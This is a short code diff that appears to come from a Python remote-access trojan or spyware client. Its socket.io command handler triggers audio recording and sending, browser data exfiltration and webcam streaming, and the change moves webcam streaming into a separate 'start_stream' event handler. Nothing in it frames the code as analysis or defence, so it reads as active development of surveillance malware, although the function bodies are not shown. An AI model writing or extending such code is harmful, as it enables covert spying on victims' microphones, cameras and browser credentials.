@@ -53,8 +53,12 @@ def command(data):
         record_and_send_audio(duration, sio)
     elif command == 'browserdata':
         send_browser_data(sio)
-    elif command == 'webcam':
-        gen_frames(sio)
+
+
+@sio.event
+def start_stream():
+    gen_frames(sio)
+
 
 def attempt_reconnect():
     while not sio.connected:
